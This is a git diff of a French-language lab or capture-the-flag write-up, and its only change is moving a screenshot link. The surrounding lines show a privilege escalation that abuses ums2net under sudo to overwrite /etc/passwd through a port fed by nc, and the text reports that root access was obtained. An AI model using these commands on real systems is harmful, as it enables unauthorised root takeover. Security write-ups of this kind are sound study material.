@@ -142,6 +142,8 @@ Nous avons créé une **nouvelle configuration** pour `ums2net` qui redirige les
 echo '5000 of=/etc/passwd bs=4096' > /tmp/config
 scp /tmp/config user@192.168.188.214:/tmp/
 ```
+![image12](https://github.com/user-attachments/assets/5fea9bec-9da2-4d45-9fd5-3af7f592c215)
+
 Sur la machine cible, nous exécutons :  
 
 ```bash
@@ -170,7 +172,6 @@ nc -v 192.168.188.214 5000 < ./passwd
 sudo /usr/sbin/ums2net -c /tmp/config -d  
 ```
 
-![image12](https://github.com/user-attachments/assets/5fea9bec-9da2-4d45-9fd5-3af7f592c215)
 
 ✅ **Accès root obtenu** via l’utilisateur **"aurelien"**.
 
